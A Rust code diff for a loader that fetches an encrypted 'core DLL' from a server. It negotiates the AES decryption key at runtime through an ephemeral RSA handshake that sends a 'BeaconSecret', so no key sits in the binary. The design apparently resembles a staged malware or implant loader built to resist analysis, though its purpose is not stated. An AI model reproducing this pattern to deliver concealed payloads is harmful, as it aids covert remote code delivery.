@@ -1,27 +1,67 @@
 //! DLL fetch and decrypt — downloads the encrypted core DLL from the server,
-//! decrypts the AES key using RSA, then decrypts the DLL with AES-256-GCM.
+//! negotiates the AES key over RSA at runtime, then decrypts the DLL with
+//! AES-256-GCM.
 
 use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
 use aes_gcm::aead::Aead;
 use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
-use rsa::{RsaPrivateKey, pkcs8::DecodePrivateKey};
+use rsa::{RsaPrivateKey, RsaPublicKey};
+use rsa::pkcs8::EncodePublicKey;
 use sha2::Sha256;
 
 const AES_KEY_SIZE: usize = 32;
 const AES_NONCE_SIZE: usize = 12;
 
-/// Decrypt the AES-256 key from the RSA-encrypted blob in the config.
-pub fn decrypt_aes_key(encrypted_aes_key_b64: &str, rsa_private_key_b64: &str) -> Result<[u8; AES_KEY_SIZE], String> {
-    let encrypted = B64.decode(encrypted_aes_key_b64)
-        .map_err(|e| format!("Failed to decode encrypted AES key: {}", e))?;
+/// Negotiate the core AES key with the server.
+///
+/// Generates an ephemeral RSA-2048 keypair, sends its public key + BeaconSecret
+/// to the server, and decrypts the returned AES key with the private key. No
+/// private key is ever embedded in the binary.
+pub async fn handshake_core_key(
+    server_url: &str,
+    core_key_path: &str,
+    build_id: &str,
+    beacon_secret: &str,
+) -> Result<[u8; AES_KEY_SIZE], String> {
+    let mut rng = rand::thread_rng();
+    let private_key = RsaPrivateKey::new(&mut rng, 2048).map_err(|e| e.to_string())?;
+    let public_key = RsaPublicKey::from(&private_key);
+    let pub_der = public_key.to_public_key_der().map_err(|e| e.to_string())?;
+    let pub_b64 = B64.encode(pub_der.as_bytes());
 
-    let priv_der = B64.decode(rsa_private_key_b64)
-        .map_err(|e| format!("Failed to decode RSA private key: {}", e))?;
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(30))
+        .build()
+        .map_err(|e| format!("HTTP client error: {}", e))?;
 
-    let private_key = RsaPrivateKey::from_pkcs8_der(&priv_der)
-        .map_err(|e| format!("Failed to parse RSA private key: {}", e))?;
+    let body = serde_json::json!({
+        "buildId": build_id,
+        "publicKey": pub_b64,
+        "beaconSecret": beacon_secret,
+    });
 
-    let decrypted = private_key.decrypt(rsa::Oaep::new::<Sha256>(), &encrypted)
+    let resp = client
+        .post(format!("{}{}", server_url, core_key_path))
+        .header("Content-Type", "application/json")
+        .body(body.to_string())
+        .send()
+        .await
+        .map_err(|e| format!("core key handshake failed: {}", e))?;
+
+    if !resp.status().is_success() {
+        return Err(format!("core key handshake returned HTTP {}", resp.status()));
+    }
+
+    let body = resp.text().await.map_err(|e| e.to_string())?;
+    let v: serde_json::Value = serde_json::from_str(&body).map_err(|e| e.to_string())?;
+    let encrypted_b64 = v
+        .get("encryptedKey")
+        .and_then(|x| x.as_str())
+        .ok_or("encryptedKey missing from response")?;
+
+    let encrypted = B64.decode(encrypted_b64).map_err(|e| e.to_string())?;
+    let decrypted = private_key
+        .decrypt(rsa::Oaep::new::<Sha256>(), &encrypted)
         .map_err(|e| format!("RSA decryption failed: {}", e))?;
 
     if decrypted.len() != AES_KEY_SIZE {
